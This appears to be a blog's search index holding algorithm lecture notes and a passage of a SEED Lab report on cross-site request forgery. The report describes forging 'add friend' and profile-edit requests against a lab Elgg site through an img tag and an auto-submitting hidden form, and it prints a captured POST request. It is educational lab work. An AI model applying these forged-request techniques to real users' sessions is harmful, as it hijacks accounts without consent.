<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>blog搭建中的一些问题</title>
    <url>/2022/12/20/1/</url>
    <content><![CDATA[<h5 id="1-图片封面设置"><a href="#1-图片封面设置" class="headerlink" title="1.图片封面设置"></a>1.图片封面设置</h5><p>文章cover和top image可在下面的选项中进行设置，设置cover和top img</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105174408579.png" alt="image-20230105174408579"></p>
<p>对于图床的选择，这里使用github作为图床，通过PicGo工具进行图片的上传</p>
]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
      <tags>
        <tag>blogs</tag>
      </tags>
  </entry>
  <entry>
    <title>Design and Analysis of Algorithm4</title>
    <url>/2023/01/13/Algorithm4/</url>
    <content><![CDATA[<h2 id="Divide-and-Conquer-I"><a href="#Divide-and-Conquer-I" class="headerlink" title="Divide and Conquer (I)"></a>Divide and Conquer (I)</h2><h3 id="1-分治算法介绍"><a href="#1-分治算法介绍" class="headerlink" title="1.分治算法介绍"></a>1.分治算法介绍</h3><ul>
<li>Divide(分开):将原始问题分成几个可以独立解决的子问题             </li>
<li>Conquer(击破):递归或者迭代 解决子问题，当子问题很小时，就能够被彻底解决</li>
<li>Combine(结合):将子问题的解决方案结合成整体的解决方案,由算法的核心递归结构协调</li>
</ul>
<p><strong>Why Divide-and-Conquer</strong></p>
<p>一般情况下比暴力算法要表现得好</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230114180457864.png" alt="image-20230114180457864"></p>
<p>分治算法的基本结构如下所示</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230114180713938.png" alt="image-20230114180713938"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230114180830941.png" alt="image-20230114180830941"></p>
<p>下面将介绍两种典型的递归结构</p>
<p><strong>Case 1: Subproblems Reduce Size by a Constant</strong></p>
<p>第一种情况是子问题的大小减少常数大小</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230114184450984.png" alt="image-20230114184450984"></p>
<p><strong>Case 2: Subproblems Reduce Size Linearly</strong></p>
<p>第二种情况是线性的减少子问题大小，那么复杂度计算就可以使用递归树或者主定理来解决</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230114190426918.png" alt="image-20230114190426918"></p>
<h4 id="examples"><a href="#examples" class="headerlink" title="examples"></a>examples</h4><p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230114191224102.png" alt="image-20230114191224102"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230114191240653.png" alt="image-20230114191240653"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230114191253866.png" alt="image-20230114191253866"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230114191327485.png" alt="image-20230114191327485"></p>
<h3 id="2-Chip-Test（芯片测试）"><a href="#2-Chip-Test（芯片测试）" class="headerlink" title="2.Chip Test（芯片测试）"></a>2.Chip Test（芯片测试）</h3><p>基本测试方法：将A和B两个芯片放在测试床上，进行mutual(相互)测试</p>
<p>假设：好芯片的报告一定是正确的，但是差芯片的报告就不确定的</p>
<p>这是两个芯片报告的所有情况和判断，这里就注意当两个芯片中有一个坏芯片时，那么一定会出现坏的报告</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230114192307545.png" alt="image-20230114192307545"></p>
<font  color='blue'>Input:</font> n chips, #(good) − #(bad) ≥ 1

<font  color='blue'>Question:</font>Devise(设计) a test method to choose one good chip from n chips

<font  color='blue'>Requirement:</font>相互测试的次数尽可能的小

<font  color='blue'>Starting point:</font>. Given a chip A, how to check if A is good or bad

方法：使用其它n-1个芯片测试A，也就是利用n的奇偶性

当n=7，其中好芯片的数量大于4

- A是好芯片-----至少剩下6个中3个报告是好的
- A是坏芯片------至少剩下的6个中4个报告是坏的

推广，n是一个奇数，那么好芯片的数量大于等于$(n+1)/2$

- A是好芯片-----至少剩下n-1个中$(n+1)/2-1$个报告好的
- A是坏芯片-----至少剩下n-1个中$(n+1)/2$个报告坏的

如果n是偶数，那么好芯片的数量大于$n/2+1$

- A是好芯片-------至少$n/2$个报告好
- A是坏芯片-------至少$n/2+1$个报告坏

结论：n-1份报告中，至少一半报好，那么A是好芯片，超过一半报坏，那就是坏芯片

**暴力算法**

方法：随机选择一个芯片，应用上述的测试方法，如果它是一个好的，那么测试结束。如果不是，那么就discard(丢弃)它并且随机的选择另外一个芯片，直到得到一个好芯片。

正确性：因为丢弃的是坏芯片，一直能够保证好芯片的数量大于一半

- 第一轮：随机选择一个坏芯片，最多n-1测试

- 第二轮：随机选择一个坏芯片，最多n-2测试

  <font color='red'>因为第一轮已经丢弃了一个坏芯片，举个例子7个芯片，4个好的，第一轮选择一个坏的，剩下6个4好两坏，要超过半数说坏芯片那么就测试6次，但是第二轮再选一个坏的，其实问题已经变成了6个里面选择，那么只需超过一半，其实只需要测5个也就是n-2个就可以，因为5个里就是1个坏，4个好</font>

<p>这里还有一个更加好的方法，也就是在i&gt;1轮中，也就是每轮再随机丢掉一个，这样也可以保证芯片数大于一半，那么最多需要$n-1-2i$</p>
<p>总体来说这样最坏情况下的时间复杂度是$n^2$级别的</p>
<p><strong>分治算法:</strong>这里假设n是偶数，那么就可以将n个芯片分成两组进行相互测试，剩下的芯片形成一个子问题并开始下一轮测试</p>
<p>测试和消除的规则：</p>
<ul>
<li>如果都是“好”：那么就随机选择一个进入下一轮</li>
<li>如果是其它情况就全部扔掉</li>
</ul>
<p>递归结束的情况是$n\le3$</p>
<ul>
<li>3个芯片测试一次就够了，前提是好芯片数量还是多于坏芯片<ul>
<li>如果都是好，那么说明都是好芯片，那么就随机选一个</li>
<li>如果一好一坏，说明有一个坏芯片，那么选剩下的一个</li>
<li>如果都是坏，也是说明一个坏芯片，选择剩下那个</li>
</ul>
</li>
<li>一个或者两个芯片，那么都是好芯片</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230114203243448.png" alt="image-20230114203243448"></p>
<p>这是证明为什么按照规则好芯片一定比坏芯片多，其实由上面的也可以理解，如果都为好，随机挑选一个，其它情况丢弃，丢弃的都是一好一坏或者都坏的，这样一定丢弃的坏的大于等于好的，如果都是好的就选一个，因为偶数情况下好的一定比坏的对多一个，所有选一个情况也对好的有利</p>
<p>当n是奇数的情况下，将会有一个芯片被剩下，那么就使用原始的芯片测试方法</p>
<ul>
<li></li>
<li><p>如果是好芯片那么算法就结束了</p>
</li>
<li>如果是坏芯片就消除它进入下一轮</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230114211021098.png" alt="image-20230114211021098"></p>
<p>复杂度分析</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230114211153539.png" alt="image-20230114211153539"></p>
<h3 id="3-Selection-Problem"><a href="#3-Selection-Problem" class="headerlink" title="3.Selection Problem"></a>3.Selection Problem</h3><h4 id="3-1-选择最大和最小"><a href="#3-1-选择最大和最小" class="headerlink" title="3.1 选择最大和最小"></a>3.1 选择最大和最小</h4><p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230114211451336.png" alt="image-20230114211451336"></p>
<p>中位数是一个表征数据序列的值，它是一个数据值和平均数不一样，也不受异常数据的影响</p>
<p>找最大值就扫描一遍数组，复杂度为$O(n)$</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230114212810740.png" alt="image-20230114212810740"></p>
<p>分组算法：将数列分为高数列和低数列</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230114213932475.png" alt="image-20230114213932475"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230114214102487.png" alt="image-20230114214102487"></p>
<p>复杂度计算</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230114214151005.png" alt="image-20230114214151005"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230115095619389.png" alt="image-20230115095619389"></p>
<h4 id="3-2-选择第二大的元素"><a href="#3-2-选择第二大的元素" class="headerlink" title="3.2 选择第二大的元素"></a>3.2 选择第二大的元素</h4><p>朴素的想法就是先遍历一遍找到最大的元素，然后将最大的元素剔除，然后再遍历一遍找到第二大的元素</p>
<p>时间复杂度：$W(n)=(n-1)+(n-2)=2n-3$</p>
<p>Idea:用时间换空间</p>
<ul>
<li>将在找最大值过程种被最大值打败的值记录下来为L</li>
<li>在L中选择最大的元素</li>
</ul>
<p><strong>Tournament(锦标赛) Algorithm for Second Largest</strong></p>
<p>1.将元素分为两组</p>
<p>2.在每一组中，两个元素进行比较，较大的元素进入下一级，只在列表中记录被打败的元素</p>
<p>3.重复上述过程直到只有一个元素剩下</p>
<p>4.在最大数集中选最大元素</p>
<p>这个名字来自于单场淘汰赛：球员参加双边比赛，胜者晋级下一级。等级制度一直持续到最后一场比赛确定最终获胜者。锦标赛决定了最佳球员，但在最后一场比赛中被击败的球员可能不是第二名，他可能比获胜者击败的其他球员差。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230115105633630.png" alt="image-20230115105633630"></p>
<p>上面是算法的直观表示，首先进行两两的分组，然后算出每组赢的元素并记录击败的元素，之后在最大元素的击败列表中选择第二大元素，这时候就是第二大元素，因为最大元素要成为最大的元素，一定在竞争中打败了第二大元素。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230115110308362.png" alt="image-20230115110308362"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230115211333225.png" alt="image-20230115211333225"></p>
<p>那么时间复杂度由两部分组成，一方面是总体比较数$n/2+n/4+\dots+1$，最终淘汰元素数等于n-1，因为比较一次淘汰一个元素。另外还有一部分是打败集中的元素，从上面的分析中可以得到这个数字等于淘汰的轮数，最终</p>
<script type="math/tex; mode=display">
W(n)=n-1+\lceil\log n\rceil-1</script><h4 id="3-3通用元素选择"><a href="#3-3通用元素选择" class="headerlink" title="3.3通用元素选择"></a>3.3通用元素选择</h4><p>计算中位数有广泛的应用</p>
<ul>
<li>朴素算法：排序并且找$W(n)=n\log n$</li>
<li>理想情况下文明想要线性的复杂度</li>
<li>其实对于排序已经超出了我们的需求，因为我们并不关系元素之间的相对位置</li>
</ul>
<p><strong>朴素算法：</strong></p>
<p>算法一：</p>
<ul>
<li>将选择最小元素的算法运行k次</li>
<li>时间复杂度是:$O(kn)$</li>
</ul>
<p>算法二：</p>
<ul>
<li>排序然后输出第k小的元素</li>
<li>时间复杂度$O(n\log n)$</li>
</ul>
<p>下面使用分治算法来完成这一点：</p>
<ul>
<li>使用一些$m^<em>$作为枢轴元素，用m来划分小于m的元素S1和大于$m^</em>$的元素S2<ol>
<li>If$k ≤ |S1|$, then find the k-smallest in S</li>
<li>If $k = |S1| + 1$, then m∗ is the k-smallest</li>
<li>If $k &gt; |S1| + 1$, then find the k − |S1| − 1-smallest in S2</li>
</ol>
</li>
</ul>
<font color='blue'>Question.</font>如何选择$m^*$来控制子问题的大小

<font color='red'>理想情况：</font>找到准确的中位数，但是这意味着我们需要首先解决一个相同规模的问题

真实情况：使用准中位数代替

![image-20230115231032110](https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230115231032110.png)

这是算法的基本结构，首先按5个一组对所有数据进行分组，对每组进行排序，然后找到中位数，然后按中位数大小对数组进行重新排序，这样就划分出了4个区域。C区域就是左上区域一定小于m\*，B是右上区域一定大于m\*，另外两个区域大小不确定需要进一步的比较.

下面是一个例子，由于这里k是6，左下只有5个元素，因此需要将左侧整体来看

![image-20230115231610139](https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230115231610139.png)

![image-20230115231619975](https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230115231619975.png)

下面是伪代码，4-5行是将子问题分割，7-9行是递归解决

![image-20230115231944779](https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230115231944779.png)

复杂度计算，复杂度计算被分割的质量所决定

，我们可以想一种极端的情况，也就是A和D区域在一边，也就是恰好选择了最大或者最小的中位数

![image-20230115232941485](https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230115232941485.png)

这里将n带入，得到下面的公式

![image-20230116120035922](https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116120035922.png)

然后就可以写出递归方程，$W(n)$由三部分组成，一部分是在每个5分组中找中位数是n，然后在这些中位数中再找中位数又是一个小规模问题$W(n/5)$,使用$m^*$将S分组又是一遍遍历然后得到n复杂度，最后递归最大子问题

![image-20230116120620484](https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116120620484.png)

<font color='green'>像这样的，一个问题和前面多个子问题有关系，可以使用递归树来解决，通过最大深度和层之间的关系解决：</font>

<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116120813930.png" alt="image-20230116120813930"></p>
<font color='blue'>Question.</font>为什么选择5作为每一个分组的大小

分析：分组大小会影响整体的复杂度，分组的选择会影响在每组中位数中选择，也会影响子问题的规模，这里实际是一个tradeoff

下面是计算在n=3的时候

![image-20230116121222596](https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116121222596.png)

这里的关键就是要使递归树层之间的递归关系尽量是小于1的关系逐步减小

这里对时间复杂度计算做总结

![image-20230116121353266](https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116121353266.png)

#### 3.4选择中位数的应用：优化管道设计

<font color='blue'>Problem.</font>假设由n个油井，任务是要在n个油井之间建立一个管道系统，其中有一个横着的主管道，最短路径

![image-20230116121638844](https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116121638844.png)

这里可以让油井看作有纵轴坐标的一些点，这里也就是找到坐标的中间值，下面来证明这件事，首先假设这个中位坐标向下移动了一些的距离：

![image-20230116122010416](C:\Users\lc-lzq\AppData\Roaming\Typora\typora-user-images\image-20230116122010416.png)

下面是证明，可以发现在奇数或者偶数的情况下，中间的主管道移动部分长度，最终的总和长度总是增加或者不变

![image-20230116170751519](https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116170751519.png)

### 4.最近点对问题

![image-20230116170850714](https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116170850714.png)

![image-20230116170923393](https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116170923393.png)

上面有一个非退化假设，也就是没有两个点拥有相同的x坐标或者y坐标

**Divide and Conquer**

- 分开：画一条垂直的线$l$因此两边各有$n/2$个点：$P_L,P_R$
- 击破：递归的在每一侧找到最近的点对
- <font color='red'>合并：</font>这里合并时一个最大的问题，因为可能最近的点对是穿过两侧的

下面是n=10的例子

![image-20230116171627706](https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116171627706.png)

下面是伪代码：

1. 当问题规模小于3的时候就直接计算
2. 将坐标集X和Y进行排序
3. 然后根据排序来画一条中分线
4. 递归的在中分线两侧来找min
5. 下面是合并操作，将左右集最小值和跨线的值比较

![image-20230116171908186](https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116171908186.png)

很大的问题：如何找到跨线的点对

这里我们想找到的是跨线比左右集小值还小的值，那么其实只需要上下左右延$\delta$，并将两侧切分为6个长方形，因为最小是$\delta$,而对角线小于$\delta$

![image-20230116172521237](https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116172521237.png)

第二个问题，如何来找到相对应的六个点，这里面有一个问题是从已经排序好的$Y$中只需要卡纵轴范围就可以找到值

![image-20230116191632525](https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116191632525.png)

![image-20230116191717660](https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116191717660.png)

<font color='blue'>Recap</font>

<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116192041812.png" alt="image-20230116192041812"></p>
<ul>
<li>生成一个指示表也就是哈希表大小为n，$H[i]=0$暗示点在左侧，$H[i]=1$暗示点在右侧</li>
<li>时间复杂度为n</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116192437032.png" alt="image-20230116192437032"></p>
<p>这里优化以后就是先sort然后再进行分割</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116192949691.png" alt="image-20230116192949691"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230116193018454.png" alt="image-20230116193018454"></p>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>seedlab(四)</title>
    <url>/2023/01/05/CSRF/</url>
    <content><![CDATA[<hr>
<h2 id="Cross-site-request-forgery"><a href="#Cross-site-request-forgery" class="headerlink" title="Cross site request forgery"></a><center>Cross site request forgery</center></h2><h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><p>​    本实验的目的是了解跨站请求伪造(CSRF)攻击。CSRF攻击涉及一个受害用户、一个受信任的网站和一个恶意网站。受害用户访问恶意站点时，正在与受信任的网站保持活动会话，这时候恶意网站就会将可信网站的HTTP请求注入到受害者用户会话中，造成损害。</p>
<p>​    在本实验中，我们将通过CSRF攻击来攻击一个社交网络应用。本实验将覆盖以下主题：</p>
<p>1.跨站请求伪造攻击</p>
<p>2.CSRF对抗措施：秘密令牌(secret token)和同站cookie(same-site cookie)</p>
<p>3.HTTP GET和POST请求</p>
<p>4.JavaScript和Ajax</p>
<h2 id="二、实验步骤和实验结果"><a href="#二、实验步骤和实验结果" class="headerlink" title="二、实验步骤和实验结果"></a>二、实验步骤和实验结果</h2><h3 id="2-1环境设置"><a href="#2-1环境设置" class="headerlink" title="2.1环境设置"></a>2.1环境设置</h3><p>​        首先使用dockbuild和dcup将容器环境建立起来，其中容器环境中包含我们要攻击的网络应用和恶意服务器，下面为了实现通过相应的URL对网页的访问，我们需要在/etc/hosts文件中更改相应的主机名映射规则，相应的修改内容如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125105006253.png" alt="image-20221125105006253" style="zoom:80%;" /></p>
<h3 id="2-2-Task-1：观察HTTP请求"><a href="#2-2-Task-1：观察HTTP请求" class="headerlink" title="2.2 Task 1：观察HTTP请求"></a>2.2 Task 1：观察HTTP请求</h3><p>​    在CSRF中，我们需要伪造HTTP请求，因此我们需要对合法的HTTP请求进行观察，我们下面使用两种方式来实现对HTTP请求的报文进行观察，首先我们可以通过一个名为“HTTP Header Live”的浏览器插件，当我们在网页上点击链接时，链接发出的请求将被捕获，双击可以获取报文的具体信息吗，如下图所示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125105549472.png" alt="image-20221125105549472"></p>
<p>​    我们还可以使用Web Developer Tool来对HTTP头进行观察，可以通过F12打开网页开发者工具，可以在network中查看当前通信的HTTP报文和内容。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125105750901.png" alt="image-20221125105750901"  /></p>
<h3 id="2-3-Task-2：使用GET请求的CSRF攻击"><a href="#2-3-Task-2：使用GET请求的CSRF攻击" class="headerlink" title="2.3 Task 2：使用GET请求的CSRF攻击"></a>2.3 Task 2：使用GET请求的CSRF攻击</h3><p>​    在这个任务中，我们需要 Elgg 社交网络中的两个账户 Alice 和 Samy。Samy 想成为 Alice 的朋友，但 Alice 拒绝添加他为好友。Samy 决定使用 CSRF 攻击来实现他的目标。他向 Alice 发送了一个 URL（通过 电子邮件或在发布在 Elgg 上）。Alice 对这个网址很好奇，点击了这个网址，这就把她带到了 Samy 的 网站 www.attacker32.com。假设你是 Samy，描述你如何构建网页的内容，以便当 Alice 访问该网页时， Samy 能够被添加到 Alice 的好友列表中（假设 Alice 有一个活跃的 Elgg 会话）。</p>
<p>​    首先，为了实现这个攻击，我们需要先确定一个合法的添加好友的HTTP请求(GET请求)内容是怎样的，作为攻击一方Samy可以先使用”HTTP Header Live“工具来查看加Alice好友的HTTP请求的内容，首先介绍GET和POST请求的区别，GET请求主要是将参数放在URL中，POST则通过Request Body来传递参数，post一般用于修改和写入数据，而get则目的是资源的获取和读取数据。从下图中可以看到，执行了action/friends/add的操作，并提供了firend的id是56，也就是alice的id，其中HTTP header中还含有cookie字段，这个字段会由浏览器自动进行附加，另外我们可以发现在URL中有两个额外的字段：__elgg_ts和__elgg_token，这是应对CSFR攻击的对策，由于已经将其关闭，因此就这里攻击过程中我们不需要进行考虑。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125111802759.png" alt="image-20221125111802759"></p>
<p>​    下面我们需要进行跨站请求伪造，伪造的URL中一个重要的字段就是用户的id，上面是Samy添加Alice的过程，可以从获取到的URL中找到Alice的id，如果Alice想要添加Samy为好友则需要Samy的id。通过查看member界面的html，通过查看Samy的信息可以在源代码中发现Samy的id。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125112247809.png" alt="image-20221125112247809"></p>
<p>​    下面需要修改恶意网站的代码，当受害者点击恶意网站的代码时，恶意网站会自动发出ULR请求，因为URL被放在了img标签中，当浏览器在显示网页中遇到img标签时，会自动的向src属性指定的URL发送一个HTTP GET请求，这个URL可以是任意的。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125113407200.png" alt="image-20221125113407200"></p>
<p>​    下面登录到Alice，Alice点击跨站请求伪造的网站，这里注意elgg网站要在后台运行，Alice需要和elgg网站之间有一个活跃的会话，否则Elgg不会处理Samy的伪造请求。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125113607687.png" alt="image-20221125113607687"></p>
<p>​    首先Samy给Alice发送一个邮件，邮件内容是恶意网站，Alice点击恶意网站后，可以发现在Alice的网站显示已经成功添加的Samy为friend，说明攻击成功。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221126225451146.png" alt="image-20221126225451146"></p>
<p><img src="image-20221125113744109.png" alt=""></p>
<h3 id="2-4-Task-4：使用POST请求的CSFR攻击"><a href="#2-4-Task-4：使用POST请求的CSFR攻击" class="headerlink" title="2.4 Task 4：使用POST请求的CSFR攻击"></a>2.4 Task 4：使用POST请求的CSFR攻击</h3><p>​    把自己加入 Alice 的朋友名单后，Samy 想进行更多的攻击。他想让 Alice 在她的个人资料中写 上”Samy is my Hero”，使得所有人都能够看到。当然，Alice 不喜欢 Samy，更不用说把这个声明写进她的 个人资料中。Samy 计划使用 CSRF 攻击来实现这一目标，也就是这个 Task 的目标。</p>
<p>​    攻击目标是修改受害者的个人资料。详细说来，攻击者需要伪造一个请求来修改 Elgg 的受害者 用户的资料信息。允许用户修改他们的个人资料是 Elgg 的一个功能。而当用户想修改他们的个人资料 时，他们进入 Elgg 的个人资料页面，填写一个表单，然后提交该表单，发送一个 POST 请求到服务器端的 脚本/profile/edit.php，该脚本处理请求并进行个人资料修改。</p>
<p>​    本任务要求我们使用POST请求完成，首先我们还是需要观察请求的结构，使用”HTTP Header Live”工具，我们查看修改资料的POST请求，可以在图中看出请求的URL，在HTTP的消息体中是对资料的修改内容。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125153338700.png" alt="image-20221125153338700"></p>
<p>​    下面将HTTP报文的内容进行完整的展示，可以从数据字段中看出，name是用户的名称，descrption是用户的个人描述，我们需要将攻击的内容填入到这个位置，通过对修改网页对比可以发现accesslevel[description]是否将内容进行公开，2代表设置public属性，我们还可以发现最后包含一个$guid字段，很可能这个字段用来对用户的身份进行验证，我们将在后面的实验中验证这一点。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://www.seed-server.com/action/profile/edit</span><br><span class="line"></span><br><span class="line"><span class="keyword">POST</span> <span class="string">/action/profile/edit</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.seed-server.com</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------35743212122710470715708447295</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>2963</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://www.seed-server.com</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://www.seed-server.com/profile/samy/edit</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>Elgg=shv66515e5tt424u9bdqaqdidd</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line">__elgg_token=ZHNiosR48XeGCyeZCDPyw&amp;__elgg_ts=1669361819</span><br><span class="line">&amp;name=Samy</span><br><span class="line">&amp;description=</span><br><span class="line">&amp;accesslevel[description]=2</span><br><span class="line">&amp;briefdescription=</span><br><span class="line">&amp;accesslevel[briefdescription]=2</span><br><span class="line">&amp;location=</span><br><span class="line">&amp;accesslevel[location]=2</span><br><span class="line">&amp;interests=</span><br><span class="line">&amp;accesslevel[interests]=2</span><br><span class="line">&amp;skills=</span><br><span class="line">&amp;accesslevel[skills]=2</span><br><span class="line">&amp;contactemail=</span><br><span class="line">&amp;accesslevel[contactemail]=2</span><br><span class="line">&amp;phone=</span><br><span class="line">&amp;accesslevel[phone]=2</span><br><span class="line">&amp;mobile=</span><br><span class="line">&amp;accesslevel[mobile]=2</span><br><span class="line">&amp;website=</span><br><span class="line">&amp;accesslevel[website]=2</span><br><span class="line">&amp;twitter=&amp;accesslevel[twitter]=2</span><br><span class="line">&amp;guid=59</span><br></pre></td></tr></table></figure>
<p>​    下面我们将通过JavaScript代码来生成请求，下面的代码动态加载了一个表单，它的各个条被fields字符串所指定，类型被设置为POST，值得注意的是，每个表单条目都是hidden隐藏，说明此条目对用户不可见，action字段表明这个表单要提交到的URL地址，最终当程序执行到p.submit()是这个表单将被自动发送。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125154918986.png" alt="image-20221125154918986"></p>
<p>​    在javascript脚本中，处理攻击内容，我们需要填入Alice的gid，这里Alice的gid可以通过Samy加Alice好友的过程中获取，可以从下图中看出，Samy发送加好友请求的URL中包含有Alice的gid。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221125154624182.png" alt="image-20221125154624182"></p>
<p>​    Alice点击恶意网站后，将自动执行网站中嵌入的javascript脚本，将一个跨站伪造的请求发送到elgg，和task 1中一样，同样通过一个邮件吸引Alice点击恶意网站，在执行攻击时同样需要维持一个活跃的连接，攻击成功后会跳转到elgg网页，可以看到个人资料已经被修改，说明攻击成功。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221126225745492.png" alt="image-20221126225745492"></p>
<p><img src="image-20221125155313175.png" alt="image-20221125155313175"></p>
<p><strong>问题 1: 伪造的 HTTP 请求需要 Alice 的用户 ID （guid）才能正常工作。如果 Boby 专门针对 Alice 做攻击准备，他可以找到方法来获得 Alice 的用户 ID。Boby 不知道 Alice 的 Elgg 口令，所以他不能登录到 Alice 的账户来获取信息。请描述 Boby 如何解决这个问题。</strong></p>
<p>​    我们在task1和task2中已经做过相关的工作，Boby首先是可以通过对http报文的抓取来查看http报文中的内容是不是含有Alice的Guid，例如在task2中，我们通过Samy加Alice好友的操作可以从http GET的URL中看到Alice的Guid，也可以通过其他互动的操作来查看。另外，Boby还可以查看网页的HTML代码是不是含有Alice的Guid，在一些含有Alice的网页上，Alice的Guid有可能以明文的形式展示在HTML代码中。</p>
<p><strong>问题 2: 如果 Boby 想向任何访问他的恶意网页的人发动攻击。在这种情况下，他事先不知道谁在访问该网页。那么他还能发动 CSRF 攻击来修改受害者的 Elgg 资料吗？请解释原因。</strong></p>
